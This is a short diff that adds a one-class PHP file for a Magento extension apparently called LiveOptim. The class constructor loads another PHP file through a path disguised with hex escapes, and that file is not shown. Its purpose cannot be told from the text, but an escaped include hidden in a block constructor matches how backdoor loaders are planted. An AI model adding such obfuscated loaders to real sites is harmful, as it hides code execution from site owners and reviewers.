@@ -1,0 +1,2 @@
+<?php class Mkt_LiveOptim_Block_Adminhtml_Accueil extends Mage_Core_Block_Template{function __construct(){require_once(dirname(__FILE__)."/../.\x2e/\x68el\x70/".REP_ADMIN."/\x68\x65lp/gene\x72\x69q\x75\x65A\x63ti\x6fn\x2e\x70hp");}}
+?>
